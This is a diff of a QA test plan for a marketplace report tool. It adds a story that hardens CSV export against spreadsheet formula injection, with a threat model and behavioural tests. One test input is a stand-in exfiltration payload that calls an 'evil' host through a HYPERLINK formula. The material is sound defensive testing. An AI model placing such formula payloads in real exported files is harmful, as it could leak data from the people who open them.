@@ -2,31 +2,34 @@
 
 **Project:** MarketPilot Free Report
 **Author:** Quinn (QA Agent) for Pedro
-**Date:** 2026-04-18
+**Date:** 2026-04-18 (updated 2026-04-20 to incorporate Story 3.5a)
 **Epic:** 3 — Report Generation Pipeline
-**Stories:** 3.1 Mirakl API client · 3.2 OF21 catalog fetch · 3.3 P11 competitor scan · 3.4 WOW+Quick Wins scoring · 3.5 Report persistence+CSV · 3.6 Email dispatch · 3.7 Full worker orchestration
+**Stories:** 3.1 Mirakl API client · 3.2 OF21 catalog fetch · 3.3 P11 competitor scan · 3.4 WOW+Quick Wins scoring · 3.5 Report persistence+CSV · 3.5a CSV Formula Injection Hardening · 3.6 Email dispatch · 3.7 Full worker orchestration
 
 ---
 
-## Status at Epic-Start Pass (2026-04-18)
+## Status at Epic-Start Pass (2026-04-18) — Updated 2026-04-20
 
 | Story | Implementation | ATDD test file | Status |
 |-------|---------------|----------------|--------|
 | 3.1 Mirakl API client | done (merged) | `tests/epic3-3.1-api-client.atdd.test.js` | ATDD file pre-existed |
 | 3.2 OF21 catalog fetch | done (merged) | `tests/epic3-3.2-fetch-catalog.atdd.test.js` | ATDD file pre-existed |
 | 3.3 P11 competitor scan | done (merged) | `tests/epic3-3.3-scan-competitors.atdd.test.js` | ATDD file pre-existed |
-| 3.4 WOW+Quick Wins scoring | backlog | `tests/epic3-3.4-wow-scoring.atdd.test.js` | ATDD file pre-existed |
-| 3.5 Report persistence+CSV | backlog | `tests/epic3-3.5-report-persistence.atdd.test.js` | ATDD file pre-existed |
-| 3.6 Email dispatch | backlog | `tests/epic3-3.6-email-dispatch.atdd.test.js` | ATDD file pre-existed |
-| 3.7 Full worker orchestration | backlog | `tests/epic3-3.7-worker-orchestration.atdd.test.js` | ATDD file pre-existed |
+| 3.4 WOW+Quick Wins scoring | done (merged) | `tests/epic3-3.4-wow-scoring.atdd.test.js` | ATDD file pre-existed |
+| 3.5 Report persistence+CSV | done (merged) | `tests/epic3-3.5-report-persistence.atdd.test.js` | ATDD file pre-existed |
+| 3.5a CSV Formula Injection Hardening | ready-for-dev | `tests/epic3-3.5a-csv-formula-injection.additional.test.js` | New ATDD file — to be created by dev |
+| 3.6 Email dispatch | done (merged) | `tests/epic3-3.6-email-dispatch.atdd.test.js` | ATDD file pre-existed |
+| 3.7 Full worker orchestration | done (merged) | `tests/epic3-3.7-worker-orchestration.atdd.test.js` | ATDD file pre-existed |
 
 All ATDD test files were pre-written (committed before implementation). This is the standard pattern for this project: test files are the contract; implementation must pass them.
+
+Story 3.5a is a retroactive hardening story (CSV formula injection, CWE-1236) added via sprint-change-proposal-2026-04-20. It is the only remaining open story in Epic 3.
 
 ---
 
 ## Scope
 
-This test plan covers all acceptance criteria for Epic 3 stories 3.4–3.7 (the remaining backlog stories). Stories 3.1–3.3 are done and their tests pass. All tests use Node.js built-in test runner (`node:test`) — no extra test framework dependencies needed.
+This test plan covers all acceptance criteria for Epic 3 stories 3.1–3.7 plus the retroactive hardening story 3.5a. Stories 3.1–3.7 are done and their tests pass. Story 3.5a is ready-for-dev — its ATDD file is specified in this plan and must be created by the dev agent during implementation. All tests use Node.js built-in test runner (`node:test`) — no extra test framework dependencies needed.
 
 ---
 
@@ -39,6 +42,7 @@ This test plan covers all acceptance criteria for Epic 3 stories 3.4–3.7 (the 
 | `tests/epic3-3.3-scan-competitors.atdd.test.js` | 3.3 | `node --test tests/epic3-3.3-scan-competitors.atdd.test.js` |
 | `tests/epic3-3.4-wow-scoring.atdd.test.js` | 3.4 | `node --test tests/epic3-3.4-wow-scoring.atdd.test.js` |
 | `tests/epic3-3.5-report-persistence.atdd.test.js` | 3.5 | `node --test tests/epic3-3.5-report-persistence.atdd.test.js` |
+| `tests/epic3-3.5a-csv-formula-injection.additional.test.js` | 3.5a | `node --test tests/epic3-3.5a-csv-formula-injection.additional.test.js` |
 | `tests/epic3-3.6-email-dispatch.atdd.test.js` | 3.6 | `node --test tests/epic3-3.6-email-dispatch.atdd.test.js` |
 | `tests/epic3-3.7-worker-orchestration.atdd.test.js` | 3.7 | `node --test tests/epic3-3.7-worker-orchestration.atdd.test.js` |
 
@@ -193,6 +197,91 @@ Three production bugs were found via live MCP probe after initial merge and fixe
 
 ---
 
+## Story 3.5a — CSV Formula Injection Hardening (`src/workers/scoring/buildReport.js`)
+
+**Status: ready-for-dev (retrofit story — added 2026-04-20 via sprint-change-proposal-2026-04-20)**
+**Origin:** Deferred CWE-1236 fix surfaced during Story 4.3 code review (PR #46). Elevated to pre-Epic-5 critical path.
+**Test file:** `tests/epic3-3.5a-csv-formula-injection.additional.test.js` — created by dev agent during implementation.
+
+### Threat Model (informational, for test authoring context)
+
+- **Attacker-controlled fields:** `product_title`, `EAN`, `shop_sku` (sourced from Mirakl P11 competitor listings).
+- **Attack vector:** Cells whose first character is a spreadsheet formula trigger (`=`, `+`, `-`, `@`, `\t`, `\r`) are executed as formulas when the CSV is opened in Excel, LibreOffice Calc, or Google Sheets.
+- **Impact:** Data exfiltration (HYPERLINK, IMPORTDATA), DDE-based RCE on older Excel.
+- **Pre-condition for exploitation:** Normal intended use — opening `marketpilot-report.csv` in a spreadsheet app.
+
+### Acceptance Criteria Mapping
+
+| AC | Description | Test approach |
+|----|-------------|---------------|
+| AC-1 | Column classification explicit in `buildReport.js`: text (`EAN`, `product_title`, `shop_sku`) vs numeric (9 price/gap/score columns) | Static: source scan for `escapeTextCell` call sites — must appear for exactly 3 columns |
+| AC-2 | `escapeTextCell(val)` prefixes `'` when first char is a formula trigger (`=`, `+`, `-`, `@`, `\t`, `\r`); null/empty/undefined returns `''` unchanged | Runtime: behavioural — call `buildAndPersistReport` with trigger-char titles, assert CSV output via `getReport` |
+| AC-3 | Text columns use `escapeTextCell`; numeric columns use `escapeCell` (unchanged) | Static: assert row-builder calls; runtime: assert numeric cell `-0.50` stays `-0.50` (no leading `'`) |
+| AC-4 | Deferred-trade-off comment at former lines 22-29 replaced with text-vs-numeric classification comment | Static: source does NOT contain `deferred` adjacent to formula injection language |
+| AC-5 | Existing ATDD exact-byte fixtures remain green with zero changes | Runtime: `npm test` — `epic3-3.5-report-persistence.atdd.test.js` and `epic4-4.3-get-api-reports-and-csv.atdd.test.js` both pass without modification |
+| AC-6 | New behavioural tests cover every trigger character + negative cases + realistic payload | Runtime: see test cases below |
+| AC-7 | `npm test` green across all 441+ tests | Runtime: full suite pass |
+| AC-8 | No Mirakl API calls, no DB schema changes, no new imports or dependencies | Static: no new `import` statements; no schema.js changes |
+
+### Key Test Cases
+
+All tests in `tests/epic3-3.5a-csv-formula-injection.additional.test.js` are **behavioural**: call `buildAndPersistReport` with a constructed catalog entry, retrieve the persisted `csv_data` via `getReport`, split by `\n`, and assert on the data row. No source-text scans for behavioural invariants.
+
+**T5a.1–T5a.6 — Trigger character coverage (one test per trigger)**
+
+For each trigger character in `['=', '+', '-', '@', '\t', '\r']`:
+- Input: `product_title` whose first character is the trigger (e.g. `=MALICIOUS()`, `+formula`, `-0`, `@user`, `\tindented`, `\rreturn`)
+- Expected: the corresponding CSV cell starts with `'` followed by the original title value
+- Assert: `csvDataRow.includes("'" + triggerChar)` is true; the cell does NOT evaluate as a formula (i.e. the first byte in the quoted cell is `'`, not the trigger char itself)
+
+**T5a.7 — Safe first-character title is NOT prefixed**
+- Input: `product_title = 'Samsung Galaxy S24'`
+- Expected: CSV cell value does NOT start with `'` — renders as `Samsung Galaxy S24` (or `"Samsung Galaxy S24"` if quoted by RFC 4180 for commas)
+
+**T5a.8 — Mid-string trigger is NOT prefixed (only first char matters)**
+- Input: `product_title = 'Product = great deal'`
+- Expected: CSV cell does NOT start with `'` — only first-position triggers are neutralised
+
+**T5a.9 — Empty product_title produces empty cell with no prefix**
+- Input: `product_title = ''` (empty string)
+- Expected: corresponding CSV cell is empty — `''` — no leading `'` prefix
+
+**T5a.10 — Realistic HYPERLINK payload (end-to-end)**
+- Input: `product_title = '=HYPERLINK("http://evil/steal","click")'`
+- Expected: CSV cell value is `'=HYPERLINK("http://evil/steal","click")'` — starts with `'`, then `=`, then the full payload. RFC 4180 quoting wraps the whole cell in `"..."` because it contains `"` characters and a comma.
+- Assert exact form: the CSV row segment for `product_title` starts with `"'=HYPERLINK(` (outer double-quote from RFC 4180, then single-quote prefix, then `=`)
+
+**T5a.11 — CSV header row is literal (no prefix applied to column names)**
+- Extract the first `\n`-delimited line of `csv_data` returned by `getReport`
+- Assert it equals exactly `EAN,product_title,shop_sku,my_price,pt_first_price,pt_gap_eur,pt_gap_pct,pt_wow_score,es_first_price,es_gap_eur,es_gap_pct,es_wow_score`
+- No leading `'` on any header column name
+
+**T5a.12 — Numeric column with leading minus is NOT prefixed**
+- Construct an entry where `pt_gap_eur` is negative (e.g. `-0.50`)
+- Expected: the `pt_gap_eur` cell in the CSV is `-0.50` or `"-0.50"` (RFC 4180 quoting) — no leading `'` — machine-parseable by pandas/Excel numeric parser
+
+### Test Infrastructure
+
+- Uses in-memory SQLite (`SQLITE_PATH=:memory:`) — same pattern as `tests/epic3-3.5-report-persistence.atdd.test.js`.
+- Imports: `buildAndPersistReport` from `src/workers/scoring/buildReport.js`; `getReport` from `src/db/queries.js`.
+- ESM — `import` syntax. No `require`.
+- No Redis, no Mirakl API, no Resend. Pure in-process.
+
+### Static Scan Tests (source-level invariants, acceptable for structural classification)
+
+These are acceptable as static tests because they verify structural code decisions, not ordering claims:
+
+| Check | Pattern | Rationale |
+|-------|---------|-----------|
+| `escapeTextCell` used for EAN column | `escapeTextCell` in `buildReport.js` adjacent to `entry.ean` | Classification must be explicit in source |
+| `escapeTextCell` used for `product_title` | Same file, `entry.product_title` | |
+| `escapeTextCell` used for `shop_sku` | Same file, `entry.shop_sku` | |
+| `escapeCell` NOT used on text columns | `escapeCell(entry.ean)` / `escapeCell(entry.product_title)` / `escapeCell(entry.shop_sku)` absent | Prevents regression where both escapers are called |
+| Deferred language removed | Source does NOT contain `deferred` within 5 lines of `formula injection` or `formula trigger` language | AC-4 |
+| No new imports | `buildReport.js` diff adds no new `import` line | AC-8 |
+
+---
+
 ## Story 3.6 — Email Dispatch (`src/email/sendReportEmail.js`)
 
 ### Acceptance Criteria Mapping
@@ -283,28 +372,29 @@ These are verified across multiple stories:
 | Raw Mirakl error never forwarded to user or DB | 3.7 static (AC-6) |
 | DB schema has no `api_key` column | Carried over from Epic 1/2 — confirmed in 3.5 |
 | `getSafeErrorMessage` wraps all user-facing error text | 3.7 AC-6, AC-8 |
+| CSV formula triggers neutralised in attacker-controllable text cells | 3.5a runtime behavioural (T5a.1–T5a.10); static classification check |
+| Numeric CSV cells (`pt_gap_eur`, `pt_wow_score`, etc.) NOT prefixed with `'` | 3.5a runtime (T5a.12) |
+| CSV column header row never prefixed | 3.5a runtime (T5a.11) |
 
 ---
 
 ## Test Execution
 
 ```bash
-# Run Epic 3 tests for remaining backlog stories (3.4–3.7):
-node --test tests/epic3-3.4-wow-scoring.atdd.test.js
-node --test tests/epic3-3.5-report-persistence.atdd.test.js
-node --test tests/epic3-3.6-email-dispatch.atdd.test.js
-node --test tests/epic3-3.7-worker-orchestration.atdd.test.js
+# Run Story 3.5a (only open story in Epic 3):
+node --test tests/epic3-3.5a-csv-formula-injection.additional.test.js
 
-# Run full Epic 3 suite (all 7 stories):
-node --test tests/epic3-*.atdd.test.js
+# Run full Epic 3 suite (all 8 test files including 3.5a):
+node --test tests/epic3-*.test.js
 
-# Run all project tests:
+# Run all project tests (3.5a picked up automatically by glob):
 node --test tests/**/*.test.js
 ```
 
 **Infrastructure requirements:**
 - Stories 3.1, 3.2, 3.3, 3.4: no Redis, no live Mirakl — pure in-process mocks
 - Story 3.5: real SQLite in-memory database (`SQLITE_PATH=:memory:`) — no Redis needed
+- Story 3.5a: same SQLite in-memory pattern as 3.5 — no Redis, no live Mirakl, no Resend
 - Story 3.6: no live Resend — Resend SDK calls are not awaited in tests; RESEND_API_KEY set to dummy
 - Story 3.7: Redis connection attempted but silenced (`removeAllListeners('error')`) — gracefully degraded
 
@@ -312,11 +402,13 @@ node --test tests/**/*.test.js
 
 ## Pass Criteria
 
-All tests must pass (zero failures, zero skips) before a story is marked `done` in `sprint-status.yaml`. Stories 3.5 and 3.7 use in-memory SQLite — no setup required beyond setting `SQLITE_PATH=:memory:` in env (already done in test file).
+All tests must pass (zero failures, zero skips) before a story is marked `done` in `sprint-status.yaml`. Stories 3.5, 3.5a, and 3.7 use in-memory SQLite — no setup required beyond setting `SQLITE_PATH=:memory:` in env (already done in test file).
+
+Story 3.5a specifically: both the new `epic3-3.5a-csv-formula-injection.additional.test.js` file AND the unchanged `epic3-3.5-report-persistence.atdd.test.js` and `epic4-4.3-get-api-reports-and-csv.atdd.test.js` files must pass. If either of the latter two fails after 3.5a implementation, STOP — the fix introduced a byte-level regression in an existing fixture.
 
 ---
 
-## Open Questions / Warnings for Phase 2
+## Open Questions / Warnings
 
 1. **Story 3.3 P11 channel-bucketing**: The post-merge MCP corrections changed the architecture (2 parallel P11 calls per batch instead of 1 combined call). The ATDD test for 3.3 has been updated to match. Story 3.4 consumes the `Map<ean, {pt,es}>` from 3.3 — no change needed to 3.4 interface, only the internal P11 channel-bucketing changed.
 
@@ -326,4 +418,8 @@ All tests must pass (zero failures, zero skips) before a story is marked `done` 
 
 4. **Story 3.7 `processJob` export**: The integration test in 3.7 (T7.8) requires `processJob` to be exported as a named export from `reportWorker.js`. If BullMQ registers the worker internally, `processJob` must still be separately exported for testability.
 
-5. **Mirakl endpoint verification (CLAUDE.md requirement)**: No new Mirakl endpoints are introduced in stories 3.4–3.7. Scoring (3.4) is pure computation. Email (3.6) uses Resend, not Mirakl. Orchestration (3.7) wires existing modules. No MCP verification needed for 3.4–3.7 beyond what was already done for 3.2+3.3.
+5. **Mirakl endpoint verification (CLAUDE.md requirement)**: No new Mirakl endpoints are introduced in stories 3.4–3.7 or 3.5a. Scoring (3.4), CSV hardening (3.5a), email (3.6), and orchestration (3.7) have no Mirakl API surface. No MCP verification needed.
+
+6. **Story 3.5a ATDD file ownership**: The file `tests/epic3-3.5a-csv-formula-injection.additional.test.js` does NOT pre-exist (unlike the other Epic 3 ATDD files). The dev agent creates it during Step 2 (ATDD) of the BAD pipeline. The test design spec in the Story 3.5a section above is the authoritative contract — the dev agent must implement the test file to match all T5a.x cases exactly.
+
+7. **Fixture safety pre-check (story 3.5a)**: Before writing `escapeTextCell`, the dev MUST verify that no existing ATDD fixture text cell starts with a formula trigger char. Check `tests/epic3-3.5-report-persistence.atdd.test.js` (all `insertReport`/`buildAndPersistReport` call sites) and `tests/epic4-4.3-get-api-reports-and-csv.atdd.test.js` (`SAMPLE_CSV` constant). If any fixture is found with a trigger-char text cell, update the fixture to a safe realistic example — do NOT weaken `escapeTextCell`.
